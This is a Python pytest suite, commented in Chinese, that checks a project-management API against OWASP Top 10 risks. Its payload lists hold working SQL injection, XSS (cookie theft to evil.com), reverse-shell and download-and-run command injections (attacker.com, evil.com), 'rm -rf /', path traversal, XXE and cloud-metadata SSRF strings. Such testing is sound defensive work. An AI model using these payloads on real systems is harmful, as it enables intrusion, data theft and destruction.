"""
OWASP Top 10 安全测试

全面的安全测试套件，覆盖 OWASP Top 10 安全风险
"""

import pytest
import re
import json
import time
from datetime import datetime, timedelta
from typing import Dict, List, Any
from tests.conftest import create_test_project, create_test_task, create_test_agent


class OWASPPayloads:
    SQL_INJECTION_PAYLOADS = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "1' ORDER BY 1--",
        "1' ORDER BY 2--",
        "1' ORDER BY 3--",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL, NULL--",
        "' UNION SELECT NULL, NULL, NULL--",
        "1'; DROP TABLE users--",
        "1'; DELETE FROM users WHERE '1'='1",
        "admin'--",
        "admin' #",
        "' OR 1=1--",
        "' OR 'x'='x",
        "1 AND 1=1",
        "1 AND 1=2",
        "1 OR 1=1",
        "'; EXEC xp_cmdshell('dir')--",
        "1; EXEC sp_executesql N'SELECT * FROM users'",
        "1' AND SLEEP(5)--",
        "1' WAITFOR DELAY '0:0:5'--",
        "1' AND BENCHMARK(10000000,SHA1('test'))--",
        "-1' UNION SELECT username,password FROM users--",
        "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    ]

    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<script>alert(document.cookie)</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "<body onload=alert('XSS')>",
        "<iframe src='javascript:alert(1)'>",
        "<a href='javascript:alert(1)'>click</a>",
        "<div onmouseover='alert(1)'>hover</div>",
        "<input onfocus=alert(1) autofocus>",
        "<marquee onstart=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "javascript:alert(1)",
        "<img src='x' onerror='alert(1)'>",
        "<svg><script>alert(1)</script></svg>",
        "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
        "'\"><script>alert(1)</script>",
        "<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
        "<img src=x onerror=\"eval(atob('YWxlcnQoJ3hzcycp'))\">",
        "{{constructor.constructor('alert(1)')()}}",
        "<%3Cscript%3Ealert(1)%3C/script%3E>",
        "&#60;script&#62;alert(1)&#60;/script&#62;",
        "<ScRiPt>alert(1)</sCrIpT>",
        "<SCRIPT>alert(1)</SCRIPT>",
        "<<script>alert(1)//<</script>",
        "<script src=http://evil.com/xss.js></script>",
    ]

    COMMAND_INJECTION_PAYLOADS = [
        "; ls -la",
        "| ls -la",
        "& ls -la",
        "&& ls -la",
        "|| ls -la",
        "; cat /etc/passwd",
        "| cat /etc/passwd",
        "& cat /etc/passwd",
        "`cat /etc/passwd`",
        "$(cat /etc/passwd)",
        "; id",
        "| id",
        "& id",
        "; whoami",
        "| whoami",
        "& whoami",
        "; rm -rf /",
        "| rm -rf /",
        "&& rm -rf /",
        "; nc -e /bin/sh attacker.com 4444",
        "| nc -e /bin/sh attacker.com 4444",
        "; wget http://evil.com/shell.sh | bash",
        "| curl http://evil.com/shell.sh | bash",
    ]

    PATH_TRAVERSAL_PAYLOADS = [
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "../../../etc/shadow",
        "../../../var/log/auth.log",
        "..%252f..%252f..%252fetc/passwd",
        "..%c0%af..%c0%af..%c0%afetc/passwd",
        "..%255c..%255c..%255cwindows/system32/config/sam",
        "....//....//....//etc/passwd",
        "/etc/passwd%00",
        "../../../etc/passwd%00.jpg",
        "..%00/..%00/..%00/etc/passwd",
        "....//....//....//etc/passwd",
        "..///////..////..//////etc/passwd",
    ]

    LDAP_INJECTION_PAYLOADS = [
        "*)(uid=*))(|(uid=*",
        "*)(|(cn=*))",
        "admin)(&(password=*))",
        "admin)(|(password=*))",
        "*)(&))",
        "*)(objectClass=*))(|(objectClass=*",
        "admin)(cn=*))(|(cn=",
        "*)((cn=",
        "admin)((userPassword=*))",
        "*)(mail=*))(|(mail=*",
    ]

    XXE_PAYLOADS = [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/xxe.dtd">%xxe;]><foo></foo>',
    ]

    SSRF_PAYLOADS = [
        "http://localhost/admin",
        "http://127.0.0.1/admin",
        "http://[::1]/admin",
        "http://0.0.0.0/admin",
        "http://localtest.me",
        "http://customer1.app.localhost.my.company.127.0.0.1.nip.io",
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "file:///etc/passwd",
        "file:///c:/windows/win.ini",
        "dict://127.0.0.1:6379/info",
        "gopher://127.0.0.1:6379/_INFO",
    ]


class SecurityTestResult:
    def __init__(self, test_name: str, category: str):
        self.test_name = test_name
        self.category = category
        self.passed = 0
        self.failed = 0
        self.warnings = 0
        self.details: List[Dict[str, Any]] = []
        self.start_time = datetime.utcnow()
        self.end_time: datetime = None

    def add_result(self, payload: str, passed: bool, response_code: int, message: str = ""):
        self.details.append({
            "payload": payload,
            "passed": passed,
            "response_code": response_code,
            "message": message,
            "timestamp": datetime.utcnow().isoformat()
        })
        if passed:
            self.passed += 1
        else:
            self.failed += 1

    def add_warning(self, payload: str, message: str):
        self.warnings += 1
        self.details.append({
            "payload": payload,
            "passed": None,
            "response_code": None,
            "message": f"WARNING: {message}",
            "timestamp": datetime.utcnow().isoformat()
        })

    def finalize(self):
        self.end_time = datetime.utcnow()

    @property
    def duration(self) -> float:
        if self.end_time:
            return (self.end_time - self.start_time).total_seconds()
        return 0.0

    @property
    def is_secure(self) -> bool:
        return self.failed == 0

    def to_dict(self) -> Dict[str, Any]:
        return {
            "test_name": self.test_name,
            "category": self.category,
            "passed": self.passed,
            "failed": self.failed,
            "warnings": self.warnings,
            "total_tests": self.passed + self.failed,
            "duration_seconds": self.duration,
            "is_secure": self.is_secure,
            "details": self.details
        }


@pytest.mark.security
@pytest.mark.owasp
class TestSQLInjection:
    """OWASP A03:2021 - 注入攻击测试"""

    def test_sql_injection_in_query_params(self, client, db_session):
        """测试查询参数中的SQL注入"""
        result = SecurityTestResult("SQL注入测试-查询参数", "A03:2021-注入")

        for payload in OWASPPayloads.SQL_INJECTION_PAYLOADS:
            try:
                response = client.get(f"/api/projects/", params={"search": payload})
                passed = response.status_code in [200, 400, 422]
                error_in_response = "SQL" in response.text or "syntax" in response.text.lower()
                if error_in_response:
                    passed = False
                    result.add_result(payload, False, response.status_code, "响应中包含SQL错误信息")
                else:
                    result.add_result(payload, passed, response.status_code)
            except Exception as e:
                result.add_result(payload, False, 0, str(e))

        result.finalize()
        assert result.is_secure, f"SQL注入测试失败: {result.failed} 个payload未通过"

    def test_sql_injection_in_post_body(self, client, db_session):
        """测试POST请求体中的SQL注入"""
        result = SecurityTestResult("SQL注入测试-POST请求体", "A03:2021-注入")

        for payload in OWASPPayloads.SQL_INJECTION_PAYLOADS[:10]:
            try:
                project_data = {
                    "name": payload,
                    "description": f"Test project with payload: {payload}",
                    "tech_stack": ["Python"],
                    "status": "REQUIREMENT"
                }
                response = client.post("/api/projects/", json=project_data)
                passed = response.status_code in [200, 201, 400, 422]
                if response.status_code in [200, 201]:
                    data = response.json()
                    if "DROP" in str(data) or "DELETE" in str(data):
                        passed = False
                        result.add_result(payload, False, response.status_code, "响应中包含危险SQL关键字")
                    else:
                        result.add_result(payload, True, response.status_code)
                else:
                    result.add_result(payload, passed, response.status_code)
            except Exception as e:
                result.add_result(payload, False, 0, str(e))

        result.finalize()

    def test_sql_injection_in_path_params(self, client, db_session):
        """测试路径参数中的SQL注入"""
        result = SecurityTestResult("SQL注入测试-路径参数", "A03:2021-注入")

        for payload in OWASPPayloads.SQL_INJECTION_PAYLOADS[:10]:
            try:
                encoded_payload = payload.replace("/", "%2F").replace(" ", "%20")
                response = client.get(f"/api/projects/{encoded_payload}")
                passed = response.status_code in [200, 400, 404, 422]
                error_in_response = "SQL" in response.text or "syntax" in response.text.lower()
                if error_in_response:
                    passed = False
                    result.add_result(payload, False, response.status_code, "响应中包含SQL错误信息")
                else:
                    result.add_result(payload, passed, response.status_code)
            except Exception as e:
                result.add_result(payload, False, 0, str(e))

        result.finalize()

    def test_blind_sql_injection_time_based(self, client, db_session):
        """测试基于时间的盲注"""
        result = SecurityTestResult("SQL注入测试-时间盲注", "A03:2021-注入")

        time_based_payloads = [
            "1' AND SLEEP(1)--",
            "1' WAITFOR DELAY '0:0:1'--",
            "1' AND BENCHMARK(1000000,SHA1('test'))--",
        ]

        for payload in time_based_payloads:
            try:
                start_time = time.time()
                response = client.get(f"/api/projects/", params={"id": payload})
                elapsed_time = time.time() - start_time

                if elapsed_time > 1.5:
                    result.add_result(payload, False, response.status_code, 
                                     f"响应时间异常: {elapsed_time:.2f}秒，可能存在时间盲注漏洞")
                else:
                    result.add_result(payload, True, response.status_code)
            except Exception as e:
                result.add_result(payload, False, 0, str(e))

        result.finalize()


@pytest.mark.security
@pytest.mark.owasp
class TestXSSAttacks:
    """OWASP A03:2021 - 跨站脚本攻击测试"""

    def test_reflected_xss_in_query_params(self, client, db_session):
        """测试反射型XSS"""
        result = SecurityTestResult("XSS测试-反射型", "A03:2021-注入")

        for payload in OWASPPayloads.XSS_PAYLOADS:
            try:
                response = client.get(f"/api/projects/", params={"search": payload})
                passed = response.status_code in [200, 400, 422]

                if response.status_code == 200:
                    if payload in response.text and "<script>" in response.text.lower():
                        passed = False
                        result.add_result(payload, False, response.status_code, "响应中包含未转义的脚本")
                    else:
                        result.add_result(payload, True, response.status_code)
                else:
                    result.add_result(payload, passed, response.status_code)
            except Exception as e:
                result.add_result(payload, False, 0, str(e))

        result.finalize()

    def test_stored_xss_in_project_data(self, client, db_session):
        """测试存储型XSS"""
        result = SecurityTestResult("XSS测试-存储型", "A03:2021-注入")

        for payload in OWASPPayloads.XSS_PAYLOADS[:15]:
            try:
                project_data = {
                    "name": payload,
                    "description": payload,
                    "tech_stack": ["Python"],
                    "status": "REQUIREMENT"
                }
                response = client.post("/api/projects/", json=project_data)

                if response.status_code in [200, 201]:
                    data = response.json()
                    if payload in str(data):
                        if "<script>" in str(data).lower() and "&lt;script&gt;" not in str(data):
                            result.add_result(payload, False, response.status_code, "存储的XSS未正确转义")
                        else:
                            result.add_result(payload, True, response.status_code)
                    else:
                        result.add_result(payload, True, response.status_code)
                else:
                    result.add_result(payload, True, response.status_code, "请求被正确拒绝")
            except Exception as e:
                result.add_result(payload, False, 0, str(e))

        result.finalize()

    def test_dom_xss_in_response(self, client, db_session):
        """测试DOM型XSS"""
        result = SecurityTestResult("XSS测试-DOM型", "A03:2021-注入")

        dom_payloads = [
            "#<script>alert(1)</script>",
            "?redirect=javascript:alert(1)",
            "?callback=<script>alert(1)</script>",
        ]

        for payload in dom_payloads:
            try:
                response = client.get(f"/api/projects/{payload}")
                passed = response.status_code in [200, 400, 404, 422]

                if "<script>alert" in response.text.lower():
                    passed = False
                    result.add_result(payload, False, response.status_code, "响应中包含未转义的脚本")
                else:
                    result.add_result(payload, passed, response.status_code)
            except Exception as e:
                result.add_result(payload, False, 0, str(e))

        result.finalize()

    def test_xss_content_type_bypass(self, client, db_session):
        """测试XSS Content-Type绕过"""
        result = SecurityTestResult("XSS测试-Content-Type绕过", "A03:2021-注入")

        content_types = [
            "text/html",
            "application/xhtml+xml",
            "text/xml",
            "image/svg+xml",
        ]

        for ct in content_types:
            try:
                response = client.get(
                    "/api/projects/",
                    headers={"Accept": ct}
                )
                response_ct = response.headers.get("content-type", "")

                if "text/html" in response_ct or "image/svg+xml" in response_ct:
                    if "<script>" in response.text:
                        result.add_result(ct, False, response.status_code, 
                                         f"Content-Type {ct} 可能导致XSS")
                    else:
                        result.add_result(ct, True, response.status_code)
                else:
                    result.add_result(ct, True, response.status_code)
            except Exception as e:
                result.add_result(ct, False, 0, str(e))

        result.finalize()


@pytest.mark.security
@pytest.mark.owasp
class TestCSRFProtection:
    """OWASP A01:2021 - 访问控制失效 (CSRF) 测试"""

    def test_csrf_token_required_for_state_changing(self, client, db_session):
        """测试状态改变操作是否需要CSRF令牌"""
        result = SecurityTestResult("CSRF测试-状态改变操作", "A01:2021-访问控制")

        state_changing_endpoints = [
            ("/api/projects/", "POST", {"name": "CSRF Test", "description": "Test", "tech_stack": [], "status": "REQUIREMENT"}),
        ]

        for endpoint, method, data in state_changing_endpoints:
            try:
                if method == "POST":
                    response = client.post(endpoint, json=data)
                elif method == "PUT":
                    response = client.put(endpoint, json=data)
                elif method == "DELETE":
                    response = client.delete(endpoint)

                if response.status_code in [200, 201]:
                    result.add_warning(f"{method} {endpoint}", "状态改变操作可能未实施CSRF保护")
                    result.add_result(f"{method} {endpoint}", True, response.status_code, 
                                     "需要人工验证CSRF保护")
                elif response.status_code == 403:
                    result.add_result(f"{method} {endpoint}", True, response.status_code, 
                                     "CSRF保护生效")
                else:
                    result.add_result(f"{method} {endpoint}", True, response.status_code)
            except Exception as e:
                result.add_result(f"{method} {endpoint}", False, 0, str(e))

        result.finalize()

    def test_csrf_token_validation(self, client, db_session):
        """测试CSRF令牌验证"""
        result = SecurityTestResult("CSRF测试-令牌验证", "A01:2021-访问控制")

        invalid_tokens = [
            "",
            "invalid_token",
            "null",
            "undefined",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
        ]

        for token in invalid_tokens:
            try:
                project_data = {
                    "name": "CSRF Token Test",
                    "description": "Test",
                    "tech_stack": [],
                    "status": "REQUIREMENT"
                }
                response = client.post(
                    "/api/projects/",
                    json=project_data,
                    headers={"X-CSRF-Token": token}
                )

                if response.status_code == 403:
                    result.add_result(f"Token: {token[:20]}...", True, response.status_code, 
                                     "无效CSRF令牌被正确拒绝")
                else:
                    result.add_result(f"Token: {token[:20]}...", True, response.status_code, 
                                     "应用可能不使用CSRF令牌或使用其他保护机制")
            except Exception as e:
                result.add_result(f"Token: {token[:20]}...", False, 0, str(e))

        result.finalize()

    def test_same_site_cookie_attribute(self, client, db_session):
        """测试SameSite Cookie属性"""
        result = SecurityTestResult("CSRF测试-SameSite属性", "A01:2021-访问控制")

        try:
            response = client.get("/api/projects/")
            cookies = response.cookies

            if cookies:
                for cookie in cookies:
                    cookie_str = str(cookie)
                    if "samesite" in cookie_str.lower():
                        result.add_result(cookie.name, True, response.status_code, 
                                         "Cookie设置了SameSite属性")
                    else:
                        result.add_warning(cookie.name, "Cookie未设置SameSite属性")
                        result.add_result(cookie.name, True, response.status_code, 
                                         "需要人工检查SameSite属性")
            else:
                result.add_result("No cookies", True, response.status_code, 
                                 "响应中没有设置Cookie")
        except Exception as e:
            result.add_result("Cookie检查", False, 0, str(e))

        result.finalize()


@pytest.mark.security
@pytest.mark.owasp
class TestAuthenticationSecurity:
    """OWASP A07:2021 - 识别和身份验证失效测试"""

    def test_weak_password_acceptance(self, client, db_session):
        """测试弱密码是否被接受"""
        result = SecurityTestResult("认证测试-弱密码", "A07:2021-身份验证")

        weak_passwords = [
            "password",
            "123456",
            "qwerty",
            "abc123",
            "admin",
            "password123",
            "12345678",
            "111111",
            "1234567890",
        ]

        for password in weak_passwords:
            try:
                register_data = {
                    "username": f"testuser_{password}",
                    "password": password,
                    "email": f"test_{password}@example.com"
                }
                response = client.post("/api/auth/register", json=register_data)

                if response.status_code in [200, 201]:
                    result.add_result(password, False, response.status_code, 
                                     "弱密码被接受")
                elif response.status_code in [400, 422]:
                    result.add_result(password, True, response.status_code, 
                                     "弱密码被正确拒绝")
                else:
                    result.add_result(password, True, response.status_code, 
                                     f"端点返回{response.status_code}")
            except Exception as e:
                result.add_result(password, False, 0, str(e))

        result.finalize()

    def test_brute_force_protection(self, client, db_session):
        """测试暴力破解保护"""
        result = SecurityTestResult("认证测试-暴力破解保护", "A07:2021-身份验证")

        login_attempts = 15
        rate_limited = False

        for i in range(login_attempts):
            try:
                login_data = {
                    "username": "admin",
                    "password": f"wrong_password_{i}"
                }
                response = client.post("/api/auth/login", json=login_data)

                if response.status_code == 429:
                    rate_limited = True
                    result.add_result(f"Attempt {i+1}", True, response.status_code, 
                                     "速率限制生效")
                    break
                elif response.status_code in [401, 404]:
                    result.add_result(f"Attempt {i+1}", True, response.status_code)
                else:
                    result.add_result(f"Attempt {i+1}", True, response.status_code)
            except Exception as e:
                result.add_result(f"Attempt {i+1}", False, 0, str(e))

        if not rate_limited:
            result.add_warning("速率限制", f"在{login_attempts}次尝试后未触发速率限制")

        result.finalize()

    def test_session_management(self, client, db_session):
        """测试会话管理"""
        result = SecurityTestResult("认证测试-会话管理", "A07:2021-身份验证")

        try:
            response1 = client.get("/api/projects/")
            session_id_1 = response1.cookies.get("session_id") or response1.cookies.get("session")

            response2 = client.get("/api/projects/")
            session_id_2 = response2.cookies.get("session_id") or response2.cookies.get("session")

            if session_id_1 and session_id_2:
                if session_id_1 == session_id_2:
                    result.add_result("Session一致性", True, 200, 
                                     "会话ID保持一致")
                else:
                    result.add_result("Session一致性", True, 200, 
                                     "会话ID每次请求都变化")
            else:
                result.add_result("Session检查", True, 200, 
                                 "未使用基于Cookie的会话")
        except Exception as e:
            result.add_result("Session检查", False, 0, str(e))

        result.finalize()

    def test_password_in_response(self, client, db_session):
        """测试响应中是否包含密码"""
        result = SecurityTestResult("认证测试-密码暴露", "A07:2021-身份验证")

        try:
            project = create_test_project(db_session, name="密码暴露测试")
            response = client.get(f"/api/projects/{project.id}")

            if response.status_code == 200:
                data = response.json()
                response_str = json.dumps(data).lower()

                sensitive_fields = ["password", "passwd", "pwd", "secret", "token", "api_key", "private_key"]
                found_fields = [field for field in sensitive_fields if field in response_str]

                if found_fields:
                    result.add_result("敏感字段检查", False, response.status_code, 
                                     f"响应中包含敏感字段: {found_fields}")
                else:
                    result.add_result("敏感字段检查", True, response.status_code, 
                                     "响应中未发现敏感字段")
            else:
                result.add_result("敏感字段检查", True, response.status_code)
        except Exception as e:
            result.add_result("敏感字段检查", False, 0, str(e))

        result.finalize()


@pytest.mark.security
@pytest.mark.owasp
class TestAuthorizationSecurity:
    """OWASP A01:2021 - 访问控制失效测试"""

    def test_horizontal_access_control(self, client, db_session):
        """测试水平访问控制"""
        result = SecurityTestResult("授权测试-水平访问控制", "A01:2021-访问控制")

        try:
            project1 = create_test_project(db_session, name="项目1")
            project2 = create_test_project(db_session, name="项目2")

            response = client.get(f"/api/projects/{project1.id}")
            if response.status_code == 200:
                result.add_result("访问项目1", True, response.status_code)

            response = client.get(f"/api/projects/{project2.id}")
            if response.status_code == 200:
                result.add_result("访问项目2", True, response.status_code, 
                                 "需要验证用户是否有权访问该项目")
            else:
                result.add_result("访问项目2", True, response.status_code)
        except Exception as e:
            result.add_result("水平访问控制", False, 0, str(e))

        result.finalize()

    def test_vertical_access_control(self, client, db_session):
        """测试垂直访问控制"""
        result = SecurityTestResult("授权测试-垂直访问控制", "A01:2021-访问控制")

        admin_endpoints = [
            "/api/admin/users",
            "/api/admin/config",
            "/api/admin/logs",
            "/api/admin/stats",
        ]

        for endpoint in admin_endpoints:
            try:
                response = client.get(endpoint)

                if response.status_code == 403:
                    result.add_result(endpoint, True, response.status_code, 
                                     "管理员端点正确拒绝未授权访问")
                elif response.status_code == 404:
                    result.add_result(endpoint, True, response.status_code, 
                                     "端点不存在")
                elif response.status_code == 200:
                    result.add_result(endpoint, False, response.status_code, 
                                     "未授权用户可以访问管理员端点")
                else:
                    result.add_result(endpoint, True, response.status_code)
            except Exception as e:
                result.add_result(endpoint, False, 0, str(e))

        result.finalize()

    def test_idor_vulnerability(self, client, db_session):
        """测试IDOR漏洞"""
        result = SecurityTestResult("授权测试-IDOR", "A01:2021-访问控制")

        try:
            project = create_test_project(db_session, name="IDOR测试项目")
            task = create_test_task(db_session, title="IDOR测试任务", project_id=project.id)

            for i in range(5):
                response = client.get(f"/api/tasks/{task.id + i}")
                if response.status_code == 200:
                    if i == 0:
                        result.add_result(f"Task ID {task.id + i}", True, response.status_code)
                    else:
                        result.add_warning(f"Task ID {task.id + i}", 
                                          f"可能存在IDOR漏洞，可以访问任务ID {task.id + i}")
                        result.add_result(f"Task ID {task.id + i}", True, response.status_code, 
                                         "需要验证访问权限")
                elif response.status_code == 404:
                    result.add_result(f"Task ID {task.id + i}", True, response.status_code, 
                                     "任务不存在或无权访问")
                else:
                    result.add_result(f"Task ID {task.id + i}", True, response.status_code)
        except Exception as e:
            result.add_result("IDOR测试", False, 0, str(e))

        result.finalize()


@pytest.mark.security
@pytest.mark.owasp
class TestSensitiveDataExposure:
    """OWASP A02:2021 - 加密失效测试"""

    def test_sensitive_data_in_logs(self, client, db_session):
        """测试日志中是否包含敏感数据"""
        result = SecurityTestResult("敏感数据测试-日志", "A02:2021-加密失效")

        sensitive_patterns = [
            r"password\s*[=:]\s*\S+",
            r"api[_-]?key\s*[=:]\s*\S+",
            r"secret\s*[=:]\s*\S+",
            r"token\s*[=:]\s*\S+",
            r"private[_-]?key\s*[=:]\s*\S+",
        ]

        try:
            response = client.get("/api/projects/")
            response_text = response.text

            for pattern in sensitive_patterns:
                matches = re.findall(pattern, response_text, re.IGNORECASE)
                if matches:
                    result.add_result(pattern, False, response.status_code, 
                                     f"发现敏感数据模式: {matches}")
                else:
                    result.add_result(pattern, True, response.status_code)
        except Exception as e:
            result.add_result("日志敏感数据检查", False, 0, str(e))

        result.finalize()

    def test_error_message_information_disclosure(self, client, db_session):
        """测试错误消息信息泄露"""
        result = SecurityTestResult("敏感数据测试-错误消息", "A02:2021-加密失效")

        test_cases = [
            ("/api/projects/invalid_id", "无效ID"),
            ("/api/projects/999999999", "不存在的ID"),
            ("/api/projects/", "POST with invalid data"),
        ]

        for endpoint, description in test_cases:
            try:
                if "POST" in description:
                    response = client.post(endpoint, json={"invalid": "data"})
                else:
                    response = client.get(endpoint)

                sensitive_keywords = [
                    "Traceback", "File \"", "line ", "Exception:",
                    "SQL", "SELECT", "INSERT", "UPDATE", "DELETE",
                    "password", "secret", "key", "token",
                    "/home/", "/var/", "C:\\", "/etc/",
                ]

                found_keywords = [kw for kw in sensitive_keywords if kw.lower() in response.text.lower()]

                if found_keywords:
                    result.add_result(description, False, response.status_code, 
                                     f"错误消息包含敏感信息: {found_keywords}")
                else:
                    result.add_result(description, True, response.status_code)
            except Exception as e:
                result.add_result(description, False, 0, str(e))

        result.finalize()

    def test_api_response_data_minimization(self, client, db_session):
        """测试API响应数据最小化"""
        result = SecurityTestResult("敏感数据测试-数据最小化", "A02:2021-加密失效")

        try:
            project = create_test_project(db_session, name="数据最小化测试")
            response = client.get(f"/api/projects/{project.id}")

            if response.status_code == 200:
                data = response.json()

                unnecessary_fields = [
                    "created_by_ip",
                    "internal_notes",
                    "debug_info",
                    "raw_query",
                    "database_id",
                ]

                found_unnecessary = [field for field in unnecessary_fields if field in data]

                if found_unnecessary:
                    result.add_result("数据最小化", False, response.status_code, 
                                     f"响应包含不必要的字段: {found_unnecessary}")
                else:
                    result.add_result("数据最小化", True, response.status_code)
            else:
                result.add_result("数据最小化", True, response.status_code)
        except Exception as e:
            result.add_result("数据最小化", False, 0, str(e))

        result.finalize()


@pytest.mark.security
@pytest.mark.owasp
class TestSecurityHeaders:
    """安全头部测试"""

    def test_security_headers_presence(self, client, db_session):
        """测试安全头部是否存在"""
        result = SecurityTestResult("安全头部测试", "安全配置")

        recommended_headers = {
            "X-Content-Type-Options": "nosniff",
            "X-Frame-Options": ["DENY", "SAMEORIGIN"],
            "X-XSS-Protection": ["0", "1; mode=block"],
            "Strict-Transport-Security": None,
            "Content-Security-Policy": None,
            "Referrer-Policy": ["no-referrer", "strict-origin-when-cross-origin"],
            "Permissions-Policy": None,
        }

        try:
            response = client.get("/api/projects/")
            headers = response.headers

            for header, expected_value in recommended_headers.items():
                header_lower = header.lower()
                found_header = None

                for h in headers:
                    if h.lower() == header_lower:
                        found_header = h
                        break

                if found_header:
                    actual_value = headers[found_header]
                    if expected_value is None:
                        result.add_result(header, True, response.status_code, 
                                         f"存在: {actual_value}")
                    elif isinstance(expected_value, list):
                        if actual_value in expected_value:
                            result.add_result(header, True, response.status_code, 
                                             f"值正确: {actual_value}")
                        else:
                            result.add_warning(header, 
                                             f"值可能不正确: {actual_value}, 期望: {expected_value}")
                            result.add_result(header, True, response.status_code)
                    else:
                        if actual_value == expected_value:
                            result.add_result(header, True, response.status_code)
                        else:
                            result.add_result(header, True, response.status_code, 
                                             f"值: {actual_value}")
                else:
                    result.add_warning(header, "头部不存在")
                    result.add_result(header, True, response.status_code, "头部不存在")
        except Exception as e:
            result.add_result("安全头部检查", False, 0, str(e))

        result.finalize()

    def test_cache_control_headers(self, client, db_session):
        """测试缓存控制头部"""
        result = SecurityTestResult("缓存控制测试", "安全配置")

        try:
            project = create_test_project(db_session, name="缓存控制测试")
            response = client.get(f"/api/projects/{project.id}")

            cache_control = response.headers.get("Cache-Control", "")
            pragma = response.headers.get("Pragma", "")

            sensitive_endpoints_should_not_cache = "no-store" in cache_control or "no-cache" in cache_control

            if sensitive_endpoints_should_not_cache or "private" in cache_control:
                result.add_result("Cache-Control", True, response.status_code, 
                                 f"缓存控制正确: {cache_control}")
            else:
                result.add_warning("Cache-Control", 
                                  f"敏感数据可能被缓存: {cache_control}")
                result.add_result("Cache-Control", True, response.status_code)

            if "no-cache" in pragma.lower():
                result.add_result("Pragma", True, response.status_code)
            else:
                result.add_result("Pragma", True, response.status_code)
        except Exception as e:
            result.add_result("缓存控制检查", False, 0, str(e))

        result.finalize()


@pytest.mark.security
@pytest.mark.owasp
class TestCommandInjection:
    """命令注入测试"""

    def test_command_injection_in_inputs(self, client, db_session):
        """测试输入中的命令注入"""
        result = SecurityTestResult("命令注入测试", "A03:2021-注入")

        for payload in OWASPPayloads.COMMAND_INJECTION_PAYLOADS[:15]:
            try:
                project_data = {
                    "name": payload,
                    "description": "Command injection test",
                    "tech_stack": [],
                    "status": "REQUIREMENT"
                }
                response = client.post("/api/projects/", json=project_data)

                if response.status_code in [200, 201]:
                    data = response.json()
                    if "root:" in str(data) or "uid=" in str(data):
                        result.add_result(payload, False, response.status_code, 
                                         "命令注入可能成功执行")
                    else:
                        result.add_result(payload, True, response.status_code)
                else:
                    result.add_result(payload, True, response.status_code)
            except Exception as e:
                result.add_result(payload, False, 0, str(e))

        result.finalize()


@pytest.mark.security
@pytest.mark.owasp
class TestPathTraversal:
    """路径遍历测试"""

    def test_path_traversal_in_file_access(self, client, db_session):
        """测试文件访问中的路径遍历"""
        result = SecurityTestResult("路径遍历测试", "A01:2021-访问控制")

        for payload in OWASPPayloads.PATH_TRAVERSAL_PAYLOADS:
            try:
                response = client.get(f"/api/files/{payload}")

                if response.status_code == 200:
                    if "root:" in response.text or "[extensions]" in response.text.lower():
                        result.add_result(payload, False, response.status_code, 
                                         "路径遍历成功，敏感文件被读取")
                    else:
                        result.add_result(payload, True, response.status_code)
                elif response.status_code in [400, 403, 404]:
                    result.add_result(payload, True, response.status_code, 
                                     "路径遍历被正确阻止")
                else:
                    result.add_result(payload, True, response.status_code)
            except Exception as e:
                result.add_result(payload, False, 0, str(e))

        result.finalize()


@pytest.mark.security
@pytest.mark.owasp
class TestSSRF:
    """服务端请求伪造测试"""

    def test_ssrf_in_url_parameters(self, client, db_session):
        """测试URL参数中的SSRF"""
        result = SecurityTestResult("SSRF测试", "A10:2021-服务端请求伪造")

        for payload in OWASPPayloads.SSRF_PAYLOADS[:10]:
            try:
                response = client.get("/api/fetch", params={"url": payload})

                if response.status_code == 200:
                    if "root:" in response.text or "metadata" in response.text.lower():
                        result.add_result(payload, False, response.status_code, 
                                         "SSRF可能成功")
                    else:
                        result.add_result(payload, True, response.status_code, 
                                         "需要人工验证SSRF保护")
                elif response.status_code in [400, 403, 404]:
                    result.add_result(payload, True, response.status_code, 
                                     "SSRF被正确阻止")
                else:
                    result.add_result(payload, True, response.status_code)
            except Exception as e:
                result.add_result(payload, False, 0, str(e))

        result.finalize()


@pytest.mark.security
@pytest.mark.owasp
class TestXXE:
    """XML外部实体注入测试"""

    def test_xxe_in_xml_input(self, client, db_session):
        """测试XML输入中的XXE"""
        result = SecurityTestResult("XXE测试", "A05:2021-安全配置错误")

        for payload in OWASPPayloads.XXE_PAYLOADS:
            try:
                response = client.post(
                    "/api/import",
                    content=payload,
                    headers={"Content-Type": "application/xml"}
                )

                if response.status_code == 200:
                    if "root:" in response.text or "[fonts]" in response.text.lower():
                        result.add_result("XXE Payload", False, response.status_code, 
                                         "XXE注入成功，敏感文件被读取")
                    else:
                        result.add_result("XXE Payload", True, response.status_code, 
                                         "需要人工验证XXE保护")
                elif response.status_code in [400, 403, 404, 415]:
                    result.add_result("XXE Payload", True, response.status_code, 
                                     "XXE被正确阻止或端点不支持XML")
                else:
                    result.add_result("XXE Payload", True, response.status_code)
            except Exception as e:
                result.add_result("XXE Payload", False, 0, str(e))

        result.finalize()
